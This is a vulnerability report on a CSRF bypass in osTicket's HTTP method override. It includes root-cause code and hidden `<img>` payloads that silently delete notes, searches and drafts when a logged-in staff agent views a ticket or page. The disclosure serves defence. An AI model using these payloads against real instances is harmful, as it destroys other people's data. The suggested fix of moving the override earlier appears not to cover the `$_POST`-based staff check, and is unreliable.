# CVE Report: CSRF Protection Bypass via HTTP Method Override in osTicket

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Product** | osTicket (osTicket/osTicket) |
| **Affected Version** | <= 1.18.3 (all versions with dispatcher method override) |
| **Vulnerability Type** | CWE-352: Cross-Site Request Forgery (CSRF) |
| **Attack Vector** | Network (Remote) |
| **Authentication Required** | None |
| **User Interaction** | Required (staff agent must view attacker's ticket) |
| **CVSS 3.1 Base Score** | 6.5 (Medium) |
| **CVSS 3.1 Vector** | AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N |

## Description

osTicket is a widely-used open source support ticket system with over 3,700 GitHub stars. The application's URL dispatcher allows overriding the HTTP request method via a `_method` GET parameter. This override occurs after the CSRF token validation has already executed, creating a bypass that allows an unauthenticated attacker to perform state-changing actions on behalf of authenticated staff members by embedding a hidden `<img>` tag in a support ticket.

## Root Cause

In `include/class.dispatcher.php`, lines 32-35, the dispatcher unconditionally overrides the server's request method from a GET parameter:

```php
if (isset($_GET['_method'])) {
    $_SERVER['REQUEST_METHOD'] = strtoupper($_GET['_method']);
    unset($_GET['_method']);
}
```

The CSRF protection in `scp/staff.inc.php` (line 108) runs before the dispatcher and only checks POST requests:

```php
if ($_POST && !$ost->checkCSRFToken())
```

Similarly, the client-side CSRF check in `client.inc.php` (line 71):

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !$ost->checkCSRFToken())
```

Because the CSRF check evaluates the original GET method and passes, and the dispatcher subsequently overrides it to POST or DELETE for routing purposes, the request reaches protected handlers without a valid CSRF token.

## Impact

An unauthenticated attacker who submits a ticket containing a hidden `<img>` tag can silently perform the following actions when a staff agent views the ticket:

1. **Delete internal notes** (`DELETE /scp/ajax.php/note/{id}`) — destroy QuickNotes on user and organization profiles containing sensitive operational information (refund approvals, escalation decisions, etc.).

2. **Delete saved searches** (`DELETE /scp/ajax.php/tickets/search/{id}`) — remove staff members' custom ticket queues and saved search filters.

3. **Delete drafts** (`DELETE /scp/ajax.php/draft/{id}`) — destroy in-progress response drafts, causing loss of work.

4. **Release ticket locks** (`POST /scp/ajax.php/lock/{id}/release`) — unlock tickets that are being edited by other agents, causing edit conflicts and potential data loss.

The attacker requires no authentication — osTicket allows guest ticket submission by default. The payload fires automatically with zero clicks when the agent opens the ticket to read it.

## Proof of Concept

### Prerequisites

1. A running osTicket instance (tested on v1.18.3 with PHP 8.3)
2. A staff account with at least one QuickNote on a user profile
3. Guest ticket creation enabled (default configuration)

### Reproduction Steps

1. Start osTicket:
   ```
   docker compose up -d
   ```

2. Log into the staff panel and create a QuickNote on any user's profile (e.g., navigate to Users > click a user > add a note such as "Customer approved for refund").

3. Note the QuickNote ID (IDs are sequential starting at 1).

4. As an unauthenticated user, open a new ticket at `/open.php`.

5. In the ticket message body, switch to HTML/source mode and enter:
   ```html
   <p>Hi, I need help with my account please.</p>
   <img src="http://TARGET/scp/ajax.php/note/1?_method=DELETE"
        style="width:1px;height:1px;" />
   ```

6. Submit the ticket.

7. Log into the staff panel and open the newly submitted ticket.

8. Observe that QuickNote ID 1 has been deleted from the user's profile. The staff agent's browser loaded the `<img>` src as a GET request, the CSRF check was skipped (not a POST), the dispatcher overrode the method to DELETE, and the `deleteNote` handler executed with the agent's authenticated session.

### Alternate PoC — External page targeting multiple resources

```html
<!DOCTYPE html>
<html>
<head><title>osTicket CSRF Bypass PoC</title></head>
<body>
<h2>osTicket CSRF Method Override PoC</h2>
<p>If a staff member visits this page while logged into osTicket:</p>
<!-- Delete note ID 1 -->
<img src="http://localhost:9090/scp/ajax.php/note/1?_method=DELETE" width="0" height="0" />
<!-- Delete note ID 2 -->
<img src="http://localhost:9090/scp/ajax.php/note/2?_method=DELETE" width="0" height="0" />
<!-- Delete saved search ID 1 -->
<img src="http://localhost:9090/scp/ajax.php/tickets/search/1?_method=DELETE" width="0" height="0" />
<!-- Delete draft ID 1 -->
<img src="http://localhost:9090/scp/ajax.php/draft/1?_method=DELETE" width="0" height="0" />
<p>Resources deleted silently in the background.</p>
</body>
</html>
```

## Recommended Fix

Move the `_method` override to execute **before** the CSRF check, or validate the CSRF token for the overridden method rather than the original. The simplest fix is to perform the method override in `main.inc.php` before any CSRF validation runs:

```php
// In main.inc.php — before CSRF checks in staff.inc.php / client.inc.php
if (isset($_GET['_method'])) {
    $_SERVER['REQUEST_METHOD'] = strtoupper($_GET['_method']);
    unset($_GET['_method']);
}
```

Then remove the same block from `include/class.dispatcher.php`.

Alternatively, remove the `_method` override entirely if it is not required for application functionality, or restrict it to only accept the override from POST request bodies (`$_POST['_method']`), which would already be covered by CSRF protection.

## Timeline

| Date | Event |
|------|-------|
| 2026-04-10 | Vulnerability discovered via code audit |
| 2026-04-10 | PoC developed and tested against osTicket v1.18.3 |

## References

- https://github.com/osTicket/osTicket
- CWE-352: https://cwe.mitre.org/data/definitions/352.html
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
